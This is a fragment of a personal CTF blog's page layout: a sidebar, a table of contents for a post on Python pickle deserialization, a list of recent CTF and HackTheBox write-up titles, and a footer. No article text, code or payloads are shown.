id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/falipan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/falipan" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">初探pickle反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#object-reduce-%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.1.</span> <span class="toc-text">object.__reduce__函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#picktools"><span class="toc-number">1.0.2.</span> <span class="toc-text">picktools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.0.3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">变量覆盖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">代码执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99opcode"><span class="toc-number">1.0.4.</span> <span class="toc-text">手动编写opcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-1"><span class="toc-number">1.0.4.1.</span> <span class="toc-text">变量覆盖</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ctf-ikun"><span class="toc-number">1.0.4.2.</span> <span class="toc-text">ctf ikun</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%8B%E5%86%99%E7%89%88"><span class="toc-number">1.0.4.2.0.1.</span> <span class="toc-text">手写版</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%89%88"><span class="toc-number">1.0.4.2.0.2.</span> <span class="toc-text">代码版</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/DASCTF/" title="DASCTF"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF"/></a><div class="content"><a class="title" href="/2021/10/31/general/DASCTF/" title="DASCTF">DASCTF</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/%5BHTB%5DDT/" title="Docter"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docter"/></a><div class="content"><a class="title" href="/2021/10/31/general/%5BHTB%5DDT/" title="Docter">Docter</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/%5BQWB%5DHardXss/" title="HardXss复现"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HardXss复现"/></a><div class="content"><a class="title" href="/2021/10/31/general/%5BQWB%5DHardXss/" title="HardXss复现">HardXss复现</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/VNctf2021wp/" title="Vnctf2021"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vnctf2021"/></a><div class="content"><a class="title" href="/2021/10/31/general/VNctf2021wp/" title="Vnctf2021">Vnctf2021</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/general/%5BHTB%5DLaboratory/" title="Laboratory"><img src="/img/fire.JPG" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Laboratory"/></a><div class="content"><a class="title" href="/2021/10/31/general/%5BHTB%5DLaboratory/" title="Laboratory">Laboratory</a><time datetime="2021-10-31T08:31:17.000Z" title="Created 2021-10-31 16:31:17">2021-10-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By f4l1k</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
